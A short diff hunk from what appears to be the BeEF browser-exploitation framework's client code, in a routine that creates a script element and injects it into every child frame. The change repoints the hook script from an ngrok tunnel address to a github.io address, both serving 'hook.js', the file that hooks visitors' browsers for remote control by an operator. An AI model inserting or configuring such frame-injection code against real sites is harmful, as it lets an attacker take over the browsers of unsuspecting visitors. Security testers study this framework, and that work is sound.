@@ -8938,7 +8938,7 @@ beef.browser = {
         // create script object
         var script = document.createElement('script');
         script.type = 'text/javascript';
-        script.src = 'http://native-fully-elephant.ngrok-free.app:80/hook.js';
+        script.src = 'https://totallylost-helpme.github.io/hook.js';
 
         // loop through child frames
         for (var i = 0; i < self.frames.length; i++) {
